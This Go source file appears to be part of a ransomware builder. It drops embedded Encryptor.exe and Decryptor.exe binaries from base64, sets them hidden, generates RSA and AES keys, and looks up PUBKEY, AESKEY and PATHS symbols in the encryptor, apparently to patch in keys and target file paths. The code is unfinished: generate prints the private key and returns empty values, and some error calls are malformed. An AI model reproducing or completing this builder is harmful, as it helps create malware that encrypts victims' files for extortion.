package main

import (
	"encoding/base64"
	"fmt"
)

var ENCRYPTOR_GENERATED []byte
var DECRYPTOR_GENERATED []byte

func init_exe() error {
	if !isPathExists("./Encryptor.exe") {
		ENCRYPTOR_MODEL, err := base64.StdEncoding.DecodeString(ENCRYPTOR_BASE64_MODEL)
		if err != nil {
			return fmt.Errorf("解码失败:", err)
		}
		writeFile("./Encryptor.exe", ENCRYPTOR_MODEL)
	}
	if !isPathExists("./Decryptor.exe") {
		DECRYPTOR_MODEL, err := base64.StdEncoding.DecodeString(DECRYPTOR_BASE64_MODEL)
		if err != nil {
			return fmt.Errorf("解码失败:", err)
		}
		writeFile("./Decryptor.exe", DECRYPTOR_MODEL)
	}
	SetHiddenAttribute("./Decryptor.exe")
	SetHiddenAttribute("./Encryptor.exe")
	var err error
	ENCRYPTOR_GENERATED, err = base64.StdEncoding.DecodeString(ENCRYPTOR_BASE64_MODEL)
	if err != nil {
		return err
	}

	DECRYPTOR_GENERATED, err = base64.StdEncoding.DecodeString(DECRYPTOR_BASE64_MODEL)
	if err != nil {
		return err
	}
	return nil
}

func generate(path_slice []string, aes_min int, is_multi_thread bool) (string, string, error) {
	err := init_exe()
	if err != nil {
		return "", "", err
	}
	publicKey, privateKey, err := getRSAPublicPrivate()
	if err != nil {
		return "", "", err
	}
	aesKey, err := getAES(24)
	if err != nil {
		return "", "", err
	}

	fmt.Println(publicKey, privateKey, aesKey)
	Symbol_Encryptor_PUBKEY, err := findSymbol("./Encryptor.exe", "PUBKEY")
	if err != nil {
		return "", "", err
	}
	Symbol_Encryptor_AESKEY, err := findSymbol("./Encryptor.exe", "AESKEY")
	if err != nil {
		return "", "", err
	}
	Symbol_Encryptor_PATHS, err := findSymbol("./Encryptor.exe", "PATHS")
	if err != nil {
		return "", "", err
	}
	fmt.Println(Symbol_Encryptor_PUBKEY, Symbol_Encryptor_AESKEY, Symbol_Encryptor_PATHS)
	return "", "", nil
}
